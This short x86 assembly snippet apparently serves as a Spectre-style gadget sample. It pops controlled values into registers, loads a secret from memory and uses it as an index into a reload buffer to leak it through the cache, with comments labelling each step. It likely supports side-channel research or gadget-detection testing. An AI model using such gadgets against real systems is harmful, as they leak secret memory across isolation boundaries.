.intel_syntax noprefix

stack_controlled:
   pop    rdi
   pop    rsi
   pop    rdx         # secret address
   pop    rcx         # reload buffer
   movzx  r10, WORD PTR [rdx + 0xff]  # load secret
   mov    r11, QWORD PTR [rcx + r10]  # transmission
	jmp    0xdead
